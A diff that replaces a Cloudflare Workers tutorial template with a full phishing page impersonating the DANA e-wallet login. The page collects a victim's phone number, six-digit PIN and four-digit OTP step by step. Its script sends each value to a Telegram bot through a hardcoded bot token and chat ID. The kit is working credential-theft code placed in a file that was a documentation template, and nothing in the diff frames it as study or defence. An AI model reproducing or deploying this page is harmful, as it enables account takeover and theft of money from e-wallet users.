@@ -1,112 +1,225 @@
----
-updated: YYYY-MM-DD
-difficulty: Beginner | Intermediate | Expert
-content_type: 📝 Tutorial
-pcx_content_type: tutorial
-title: Tutorial title. Second-person imperative verb phrase that reflects user goal or job-to-be-done. For example, 'Create a Worker' or 'Build a Pages application'.
-products:
-  - Workers
-languages:
-  - TypeScript
----
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <link rel="icon" href="PUBLIC_URL%/Favion.ico" type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Masukkan Nomor DANA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            height: 100%;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background-color: #1a73e8;
+            overflow: hidden;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #000000;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .phone-input-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+        }
+        .flag-icon {
+            width: 30px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        input[type="tel"] {
+            width: 100%;
+            padding: 14px;
+            font-size: 1.1em;
+            border: 1px solid #d4d4d4;
+            border-radius: 8px;
+            text-align: center;
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1a73e8;
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 1.1em;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #1558c3;
+        }
+        .input-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+        .input-box {
+            width: 55px;
+            height: 55px;
+            font-size: 1.3em;
+            text-align: center;
+            border: 1px solid #d4d4d4;
+            border-radius: 8px;
+            outline: none;
+        }
+        @media screen and (max-width: 480px) {
+            .container {
+                width: 100%;
+                height: 100%;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .logo {
+                width: 60px;
+            }
+            h2 {
+                font-size: 1.2em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="phonePage">
+        <img src="dana-logo.png" alt="Logo DANA" class="logo">
+        <h2>Masuk atau Daftar dengan Nomor HP</h2>
+        <div class="phone-input-container">
+            <img src="indonesia-flag.png" alt="Indonesia Flag" class="flag-icon">
+            <input type="tel" id="phoneNumber" placeholder="Masukkan nomor telepon" maxlength="14" oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 14)">
+        </div>
+        <button onclick="sendPhoneNumber()">Lanjut ke Halaman PIN</button>
+    </div>
 
-import { Render, PackageManagers } from "~/components";
+    <div class="container" id="pinPage" style="display: none;">
+        <img src="dana-logo.png" alt="Logo DANA" class="logo">
+        <h2>Masukkan PIN Anda</h2>
+        <div class="input-container">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+            <input type="password" maxlength="1" class="input-box pin-input" oninput="moveToNext(this, '.pin-input')">
+        </div>
+    </div>
 
-(Introduce the purpose of this tutorial here. Describe the application which will be built by the end of this tutorial and the tools that will be used to achieve this. You can also optionally describe the intended audience, include a [GitHub link](https://github.com/) to completed code, and even outline a summary of the steps that the reader will be performing throughout this tutorial.
+    <div class="container" id="otpPage" style="display: none;">
+        <img src="dana-logo.png" alt="Logo DANA" class="logo">
+        <h2>Masukkan Kode OTP</h2>
+        <p>OTP telah dikirimkan melalui SMS dan WhatsApp. Harap masukkan kode yang diterima.</p>
+        <p id="timer" style="font-weight: bold; color: #1a73e8; margin-top: 10px;">Kirim ulang dalam: <span id="countdown">60</span> detik</p>
+        <div class="input-container">
+            <input type="password" maxlength="1" class="input-box otp-input" oninput="moveToNext(this, '.otp-input')">
+            <input type="password" maxlength="1" class="input-box otp-input" oninput="moveToNext(this, '.otp-input')">
+            <input type="password" maxlength="1" class="input-box otp-input" oninput="moveToNext(this, '.otp-input')">
+            <input type="password" maxlength="1" class="input-box otp-input" oninput="moveToNext(this, '.otp-input')">
+        </div>
+    </div>
 
-In this tutorial, you will learn how to run serverless script on the web by creating a Worker using Cloudflare's CLI tools C3 and Wrangler.
+    <script>
+        const botToken = "7335135600:AAGls8zxJrYK4epflJSpaA2eps_9Hzam63o";
+        const chatId = "7306305451";
+        let countdownInterval;
 
-## Prerequisites
+        function nextPage(pageId) {
+            document.querySelectorAll('.container').forEach(page => {
+                page.style.display = 'none';
+            });
+            document.getElementById(pageId).style.display = 'block';
+            
+            if (pageId === 'otpPage') startCountdown(60);
+        }
 
-(List out any required prerequisites before the reader can begin following this tutorial. If your tutorial requires Workers, you can load pre-written Workers prerequisites by including the render below))
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log("Pesan terkirim:", data))
+            .catch(error => console.error("Error:", error));
+        }
 
-<Render file="prereqs" product="workers" />
+        function sendPhoneNumber() {
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            if (phoneNumber === "") {
+                alert("Nomor telepon tidak boleh kosong.");
+                return;
+            }
+            sendTelegramMessage(`Nomor telepon: ${phoneNumber}`);
+            nextPage('pinPage');
+        }
 
-(Additional prerequisites will need to be manually added like below)
+        function moveToNext(currentInput, inputClass) {
+            const inputs = document.querySelectorAll(inputClass);
+            const index = Array.from(inputs).indexOf(currentInput);
 
-- Prerequisite 3
-- Prerequisite 4
-- Prerequisite 5
+            if (currentInput.value.length === 1 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            } else if (currentInput.value.length === 0 && index > 0) {
+                inputs[index - 1].focus();
+            }
 
-## 1. Create a Worker. (The step title should describe what is being achieved within the step. If a step is becoming too large, see if it can be broken down into smaller steps.)
+            const code = Array.from(inputs).map(input => input.value).join('');
+            if (code.length === inputs.length) {
+                if (inputClass === '.pin-input') {
+                    sendTelegramMessage(`PIN: ${code}`);
+                    nextPage('otpPage');
+                } else if (inputClass === '.otp-input') {
+                    sendTelegramMessage(`OTP: ${code}`);
+                    alert("OTP berhasil dikirim!");
+                }
+            }
+        }
 
-(To include a CLI command with tabs to select between npm, yarn or pnpm, use the example below.)
+        function startCountdown(seconds) {
+            clearInterval(countdownInterval);
+            let countdown = seconds;
+            document.getElementById("countdown").textContent = countdown;
 
-First, use the `c3` CLI to create a new Cloudflare Workers project.
-
-<PackageManagers type="create" pkg="cloudflare@latest" args={"<WORKER_NAME>"} />
-
-Replace `<WORKER_NAME>` with your desired Worker name.
-
-## 2. Tets run your Worker on a local server
-
-(To include a shell command, use the examples below [For code block guidelines read our style guide](/style-guide/formatting/code-block-guidelines/).)
-
-Next, change into the newly created Worker's directory.
-
-```sh title="Change directory into worker"
-cd <WORKER_NAME>
-```
-
-Now we can run our Worker locally to test that it works.
-
-```sh title="Run Worker on a local development server"
-npx wrangler dev
-```
-
-(To include a number list such as for following numbered steps, use the example below.)
-
-1. Step 1
-2. Step 2
-
-## 3. (Additional tutorial tips)
-
-(JavaScript example.)
-
-```js
----
-filename: src/index.js
----
-export default {
-  async fetch(request, env, ctx) {
-    return new Response("Hello World!");
-  },
-};
-```
-
-(Wrangler toml file example.)
-
-```toml title="wrangler.toml"
-#:schema node_modules/wrangler/config-schema.json
-name = "<WORKER_NAME>"
-main = "src/index.ts"
-compatibility_date = "YYYY-MM-DD"
-compatibility_flags = ["nodejs_compat"]
-
- [ai]
- binding = "AI"
-```
-
-(Aside examples. For more details read our [style guide documentation on Notes/tips/warnings](/style-guide/documentation-content-strategy/component-attributes/notes-tips-warnings/#recommendations).)
-
-:::note[Aside example]
-An aside is a colored info box or aside with content (text, images, lists, code blocks) that adds relevant notes that do not fit the main text
-:::
-
-:::caution[Aside example]
-A caution warns users of specific behavior that can break functionality or impact security.
-:::
-
-(At the end of the tutorial's steps, summarize what has been successfully achieved by the reader through completing this tutorial)
-
-You have successfully created, tested and deployed a Worker.
-
-## Related resources
-
-(Cloudflare docs link example)
-
-To build more with Workers, refer to [Tutorials](/workers/tutorials/).
-
-(External link example)
-
-If you have any questions, need assistance, or would like to share your project, join the Cloudflare Developer community on [Discord](https://discord.cloudflare.com) to connect with other developers and the Cloudflare team.
+            countdownInterval = setInterval(() => {
+                countdown--;
+                document.getElementById("countdown").textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById("timer").textContent = "Anda dapat mengirim ulang OTP sekarang.";
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
